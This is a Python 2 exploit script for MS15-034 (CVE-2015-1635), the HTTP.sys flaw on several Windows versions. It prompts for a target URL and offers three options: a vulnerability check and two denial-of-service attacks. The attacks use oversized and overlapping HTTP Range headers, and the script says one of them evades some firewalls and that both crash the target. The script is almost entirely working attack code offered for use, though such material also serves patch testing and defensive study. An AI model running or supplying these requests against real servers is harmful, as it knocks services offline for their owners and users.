#!/usr/bin/python

# Exploit Title: MS15-034, Vulnerability in HTTP.sys Could Allow Remote Code Execution
# Google Dork: -
# Date: 20/04/2015
# Exploit Author: Kapi
# Vendor Homepage: https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
# Software Link: https://www.microsoft.com/en-us/download/details.aspx?id=5023
# Affected Version: 
# - Windows 7 for 32-bit Systems Service Pack 1
# - Windows 7 for x64-based Systems Service Pack 1
# - Windows Server 2008 R2 for x64-based Systems Service Pack 1
# - Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
# - Windows 8 for 32-bit Systems
# - Windows 8 for x64-based Systems
# - Windows 8.1 for 32-bit Systems
# - Windows 8.1 for x64-based Systems
# - Windows Server 2012
# - Windows Server 2012 R2
# - Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
# - Windows Server 2012 (Server Core installation)
# - Windows Server 2012 R2 (Server Core installation)
# Tested on: 
# - Windows Server 2008 R2 for x64-based Systems Service Pack 1
# - Windows 7 x64
# CVE : CVE-2015-1635
# Usage: python MS15-034-with-overlapping-byte-ranges-specifier.py
# python library "httplib2": https://pypi.python.org/pypi/httplib2
# code version 2

import sys
import httplib2
from urllib import urlencode
import time
import socket

print '\t################################################################'
print '\t#                             Kapi                             #'
print '\t#                          MS15-034                            #'
print '\t#  *Notice the target may be crash after attack                #'
print '\t################################################################'
def send(fullURL,headers):
    http = httplib2.Http()
    body = {}
    response, content = http.request(fullURL, 'GET', headers=headers1, body=urlencode(body))
    resCode1 = response['status']
    s = '[*] Request ' + fullURL + ' >> ' + resCode1
    print s
    
    response, content = http.request(fullURL, 'GET', headers=headers, body=urlencode(body))
    resCode2 = response['status']
    s = '[*] Request ' + fullURL + ' >> ' + resCode2
    print s
    return (int(resCode1), int(resCode2))

try:
    print "[*] Enter full URL to an existing object(jpg, png or gif etc.) <include http/https>"
    fullURL = raw_input(">>")
    if fullURL.find("http://") != -1:
        site = fullURL.replace("http://","")
    elif  fullURL.find("https://") != -1:
        site = fullURL.replace("https://","")
    
    slashPos = site.find("/")
    if slashPos != -1:
        host = site[:-(len(site)-slashPos)]
        path = site[slashPos:len(site)]
        print ("[*] Host : " + host)
        print ("[*] Path : " + path)
    else:
        fullSite = site
        host = site
        path = "/"
    print ("[*] Full : " + fullURL)
    # header1 is a normal request to initiate connection.
    headers1 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
                'Host': "" + host
                }

    # header2 and header3 is a normal DoS attack.
    # This will cause the target to crash, change "18-" to "0-" if you want to check if the target is vulnerable (without crashing).
    headers2 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
                'Range':'bytes=0-18446744073709551615',
                'Host': "" + host
                }
    headers3 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
                'Range':'bytes=18-18446744073709551615',
                'Host': "" + host
                }

    # headers4 is a special DoS attack bypass some firewalls.
    # Technique is overlapping "byte-ranges-specifier" in HTTP header Range.
    # This will cause the target crashed.
    headers4 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
                'Range':'bytes=800000-800001,18-18446744073709551615',
                'Host': "" + host
                }

    print "-------------------------------"
    print "> Please select the operation:"
    print "> 1.Check if target is vulnerable"
    print "> 2.Normal DoS"
    print "> 3.DoS with overlapping byte-ranges-specifier"
    option = int(raw_input(">> "))
    if option==1:
        print "[*] Checking ... "
        resCode1, resCode2 = send(fullURL,headers2)
        if resCode2 == 416:
            print "[+] This server is vulnerable!!!"
        else:
            print "[!] This server is not vulnerable"
    if option==2:
        send(fullURL,headers3)
    if option==3:
        send(fullURL,headers4)
except (httplib2.HttpLib2Error,socket.error) as ex:
    print '[!] Checking ' + fullURL + ' >> ' + "error" + str(ex)